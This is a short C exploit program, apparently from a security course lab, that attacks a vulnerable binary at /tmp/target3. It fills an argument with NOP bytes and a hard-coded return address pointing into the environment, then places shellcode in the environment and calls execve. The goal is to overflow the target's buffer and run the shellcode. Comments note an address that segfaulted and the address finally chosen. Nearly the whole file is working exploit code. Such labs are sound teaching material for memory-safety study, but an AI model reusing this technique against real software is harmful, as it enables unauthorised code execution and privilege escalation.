#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3]; 
  char *env[1];

  char str[20];
  memset(str, 0, 20);

  for (int i = 0; i < 16; i++)
  {
  	strcat(str, "\x90");
  }
  // Segfault:
  // strcat(str, "\x97\xff\xff\xbf");
  // env: 0xbfffff97:	0xdb31c031

  strcat(str, "\x96\xff\xff\xbf");

  args[0] = TARGET;
  // max input size is 4 * 5 = 20
  args[1] = str;
  args[2] = NULL;
  
  env[0] = shellcode;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


